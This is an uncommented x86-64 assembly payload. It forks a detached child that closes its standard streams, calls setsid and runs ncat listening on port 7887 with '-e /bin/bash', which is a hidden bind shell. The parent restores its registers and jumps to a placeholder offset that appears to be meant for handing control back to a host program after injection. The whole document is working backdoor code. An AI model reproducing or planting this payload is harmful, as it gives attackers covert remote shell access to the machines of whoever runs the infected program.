section .text
    global _start

_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rbx

    mov rax, 57
    syscall

    lea rbx, [rel child]
    lea rdi, [rel parent]

    sub rbx, rdi
    neg rax
    sbb rax, rax
    inc rax
    mul rbx
    add rax, rdi
    jmp rax

parent:
    pop rbx
    pop rdx
    pop rsi
    pop rdi
    pop rax

    lea rax, [rel _start]
    sub rax, 0x11111111
    jmp rax

    mov rax, 60
    mov rdi, 0
    syscall

child:
    mov rax, 3
    mov rdi, 0
    syscall

    mov rax, 3
    mov rdi, 1
    syscall

    mov rax, 3
    mov rdi, 2
    syscall

    mov rax, 112
    syscall

    mov rax, 59
    lea rdi, [rel exec_file]
    lea rsi, [rel argv]
    xor rdx, rdx
    syscall

    mov rax, 60
    mov rdi, 0
    syscall


exec_file db "/usr/bin/ncat", 0x0
arg0 db "/usr/bin/ncat", 0x0
arg1 db "-l", 0x0
arg2 db "7887", 0x0
arg3 db "-e", 0x0
arg4 db "/bin/bash", 0x0
argv dq arg0, arg1, arg2, arg3, arg4, 0x0
